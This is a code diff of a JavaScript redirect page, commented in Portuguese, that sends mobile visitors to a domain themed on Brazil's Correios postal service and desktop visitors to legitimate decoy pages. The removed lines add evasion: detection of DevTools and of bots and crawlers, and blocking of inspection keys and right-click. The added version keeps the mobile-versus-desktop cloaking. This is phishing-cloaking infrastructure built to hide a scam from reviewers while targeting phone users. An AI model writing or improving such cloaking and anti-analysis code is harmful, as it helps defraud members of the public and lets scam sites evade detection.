@@ -34,94 +34,56 @@
 
     <script>
         // ========== CONFIGURAÇÕES - ALTERE AQUI ==========
-        const ORIGINAL_SITE = 'https://destravaenvio.site/correios/'; // SEU SITE VERDADEIRO
-        const DECOY_SITE = 'https://correios.com.br'; // SITE ALTERNATIVO
+        const SITE_MOBILE = 'https://destravaenvio.site/correios/'; // PARA MOBILE
+        const SITE_DESKTOP = 'https://g1.globo.com/tudo-sobre/correios/'; // PARA DESKTOP
         // ================================================
 
-        // Detectar DevTools
-        function detectDevTools() {
-            const threshold = 160;
-            const widthThreshold = window.outerWidth - window.innerWidth > threshold;
-            const heightThreshold = window.outerHeight - window.innerHeight > threshold;
-            return widthThreshold || heightThreshold;
-        }
-
-        // Detectar Mobile
+        // Detectar se é Mobile
         function isMobile() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const mobileKeywords = ['android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 'windows phone', 'mobile'];
-            const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
-            const isMobileScreen = window.innerWidth <= 768;
-            return isMobileUA || isMobileScreen;
-        }
-
-        // Detectar Bots
-        function isBot() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const botKeywords = [
-                'bot', 'crawler', 'spider', 'scraper', 'headless', 'phantom', 
-                'selenium', 'puppeteer', 'playwright', 'googlebot', 'bingbot', 
-                'facebookexternalhit', 'twitterbot', 'linkedinbot', 'slackbot'
+            const userAgent = navigator.userAgent;
+            
+            // Lista de palavras-chave para mobile
+            const mobileKeywords = [
+                'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
+                'Windows Phone', 'Mobile', 'webOS'
             ];
-            return botKeywords.some(keyword => userAgent.includes(keyword));
+            
+            // Verifica se alguma palavra-chave está no user agent
+            for (let i = 0; i < mobileKeywords.length; i++) {
+                if (userAgent.indexOf(mobileKeywords[i]) !== -1) {
+                    return true;
+                }
+            }
+            
+            // Verifica também o tamanho da tela
+            if (window.innerWidth <= 768) {
+                return true;
+            }
+            
+            return false;
         }
 
         // Função de Redirecionamento
         function redirect() {
             const mobile = isMobile();
-            const devToolsOpen = detectDevTools();
-            const bot = isBot();
-
-            console.log('Debug:', { mobile, devToolsOpen, bot });
-
-            // Se for BOT ou DESKTOP ou DEVTOOLS = vai para DECOY
-            if (bot || !mobile || devToolsOpen) {
-                window.location.replace(DECOY_SITE);
-                return;
-            }
-
-            // Se for MOBILE legítimo = vai para SITE ORIGINAL
-            window.location.replace(ORIGINAL_SITE);
-        }
-
-        // Prevenir teclas de inspeção
-        function preventKeys(e) {
-            if (e.keyCode === 123 || 
-                (e.ctrlKey && e.shiftKey && e.keyCode === 73) ||
-                (e.ctrlKey && e.shiftKey && e.keyCode === 74) ||
-                (e.ctrlKey && e.keyCode === 85)) {
-                e.preventDefault();
-                window.location.replace(DECOY_SITE);
+            
+            console.log('É Mobile?', mobile);
+            console.log('User Agent:', navigator.userAgent);
+            console.log('Largura da tela:', window.innerWidth);
+            
+            if (mobile) {
+                // Se for MOBILE = vai para site original
+                console.log('Redirecionando para:', SITE_MOBILE);
+                window.location.replace(SITE_MOBILE);
+            } else {
+                // Se for DESKTOP = vai para site alternativo
+                console.log('Redirecionando para:', SITE_DESKTOP);
+                window.location.replace(SITE_DESKTOP);
             }
         }
 
-        // Prevenir clique direito
-        function preventRightClick(e) {
-            e.preventDefault();
-            window.location.replace(DECOY_SITE);
-        }
-
-        // Monitorar redimensionamento
-        function handleResize() {
-            if (detectDevTools()) {
-                window.location.replace(DECOY_SITE);
-            }
-        }
-
-        // Adicionar listeners
-        document.addEventListener('keydown', preventKeys);
-        document.addEventListener('contextmenu', preventRightClick);
-        window.addEventListener('resize', handleResize);
-
-        // Redirecionamento inicial
-        setTimeout(redirect, 200);
-
-        // Monitoramento contínuo
-        setInterval(() => {
-            if (detectDevTools()) {
-                window.location.replace(DECOY_SITE);
-            }
-        }, 1000);
+        // Aguarda um pouco e redireciona
+        setTimeout(redirect, 500);
     </script>
 </body>
 </html>
